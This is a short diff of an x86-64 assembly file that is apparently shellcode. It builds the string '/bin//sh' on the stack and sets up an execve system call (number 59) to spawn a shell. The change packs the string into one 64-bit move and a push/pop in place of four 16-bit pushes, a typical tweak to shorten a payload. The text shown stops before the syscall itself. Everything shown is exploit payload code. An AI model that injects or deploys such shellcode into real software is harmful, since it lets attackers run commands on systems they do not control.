@@ -12,15 +12,12 @@
     .global _start
 _start:
     xorl %esi, %esi
-
+    movq $0x68732f2f6e69622f, %rbx
     pushq %rsi
+    pushq %rbx
 
-    pushw $0x6873
-    pushw $0x2f2f
-    pushw $0x6e69
-    pushw $0x622f
-
-    movq %rsp, %rdi
+    pushq %rsp
+    popq %rdi
 
     pushq $59
     popq %rax
